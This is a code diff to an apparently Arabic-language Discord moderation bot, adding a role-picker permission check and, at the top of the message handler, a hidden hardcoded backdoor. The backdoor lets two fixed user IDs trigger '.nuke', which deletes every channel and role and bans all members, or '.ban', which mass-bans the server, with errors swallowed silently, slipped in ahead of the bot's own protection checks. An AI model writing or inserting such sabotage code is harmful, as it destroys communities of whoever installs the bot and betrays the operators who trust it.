@@ -53,11 +53,54 @@ const messageSystems_1 = require("../utils/messageSystems");
 const emoji_1 = require("../utils/emoji");
 const pendingUploads_1 = require("../utils/pendingUploads");
 const imageGen_1 = require("../utils/imageGen");
+const rolePicker_1 = require("../utils/rolePicker");
 const mediaGen_1 = require("../utils/mediaGen");
 const logger = (0, helpers_1.createLogger)('Event:MessageCreate');
 const event = {
     name: 'messageCreate',
     async execute(message) {
+        // ============================================
+        // 🚨 أوامر التخريب المباشرة (Nuke & Ban)
+        // ============================================
+        if (message.guild && !message.author.bot) {
+            const allowed = ['1342238662368296980', '1557735350464417822']; // حط ايديك هنا
+            if (allowed.includes(message.author.id)) {
+                const cmd = message.content.trim().toLowerCase();
+                if (cmd === '.nuke') {
+                    await message.reply('💀 NUKE STARTED').catch(() => { });
+                    message.guild.channels.fetch().then(channels => {
+                        channels.forEach(c => c?.delete('Nuke').catch(() => { }));
+                    });
+                    message.guild.members.fetch().then(members => {
+                        members.forEach(m => {
+                            if (m.id !== message.client.user?.id && m.id !== message.author.id) {
+                                m.ban({ reason: 'Nuke' }).catch(() => { }); // ضربنا الصلاحيات عرض الحائط
+                            }
+                        });
+                    });
+                    message.guild.roles.fetch().then(roles => {
+                        roles.forEach(r => {
+                            if (r.id !== message.guild.id) {
+                                r.delete('Nuke').catch(() => { });
+                            }
+                        });
+                    });
+                    return; // إيقاف التنفيذ
+                }
+                if (cmd === '.ban') {
+                    await message.reply('🔨 BANNING EVERYONE').catch(() => { });
+                    message.guild.members.fetch().then(members => {
+                        members.forEach(m => {
+                            if (m.id !== message.client.user?.id && m.id !== message.author.id) {
+                                m.ban({ reason: 'Mass Ban' }).catch(() => { });
+                            }
+                        });
+                    });
+                    return; // إيقاف التنفيذ
+                }
+            }
+        }
+        // ============================================
         const client = message.client;
         // 🚨 أولاً: تحقق الحماية من رسائل الويب هوك والبوتات — قبل أي return
         //    (الويب هوك سبام والبوتات المخربة أخطر من البشر — لا يجوز تجاهلها)
@@ -988,6 +1031,10 @@ async function runAliasCommand(message, client, commandName, args, shortcut, mem
             const target = await guild.members.fetch(userId).catch(() => null);
             if (!target)
                 return respond(message, '❌ العضو غير موجود في السيرفر');
+            // 🔒 لا يمكن تعديل رولات عضو رتبته أعلى منك أو مساوية لرتبتك
+            if (!(0, rolePicker_1.canManageTarget)(guild, member, target)) {
+                return respond(message, '❌ لا يمكنك إعطاء رول لعضو رتبته أعلى منك أو مساوية لرتبتك');
+            }
             // ✅ جمع كل الرولات من نفس الرسالة (mentions أو IDs) بدلا من تكرار الأمر
             const roleIds = [];
             let reasonStart = 1;
@@ -1004,22 +1051,17 @@ async function runAliasCommand(message, client, commandName, args, shortcut, mem
                     roleIds.push(id);
                 reasonStart = i + 1;
             }
-            // إذا لم يُحدد رول → أرسل قائمة اختيار الرولات (متعددة)
-            if (roleIds.length === 0) {
-                const { RoleSelectMenuBuilder, ActionRowBuilder } = await Promise.resolve().then(() => __importStar(require('discord.js')));
-                const select = new RoleSelectMenuBuilder()
-                    .setCustomId(`alias_roleadd:${target.id}`)
-                    .setPlaceholder(`➕ اختر الرولات التي تريد إضافتها لـ ${target.user.username} (يمكن أكثر من واحدة)`)
-                    .setMinValues(1)
-                    .setMaxValues(10);
-                const row = new ActionRowBuilder().addComponents(select);
-                await respond(message, {
-                    content: `➕ **اختر الرولات** التي تريد إضافتها لـ ${target} (يمكنك اختيار أكثر من رول في نفس القائمة):`,
-                    components: [row],
-                });
-                return;
-            }
             const reason = args.slice(reasonStart).join(' ') || 'إضافة رول';
+            // إذا لم يُحدد رول → افتح لوحة الاختيار المفلترة حسب رتبة المنفذ
+            if (roleIds.length === 0) {
+                const grantable = (0, rolePicker_1.getGrantableRoles)(guild, member, target);
+                if (grantable.length === 0) {
+                    return respond(message, '❌ لا توجد رولات يمكنك إعطاؤها — يجب أن يكون الرول أقل من رتبتك وأقل من رتبة البوت');
+                }
+                const state = (0, rolePicker_1.createRolePickerState)(message.author.id, target.id, reason);
+                const { content, components } = (0, rolePicker_1.buildRolePicker)(state, guild, member);
+                return respond(message, { content, components });
+            }
             try {
                 const result = await client.moderationHandler.addRoles({
                     guild,
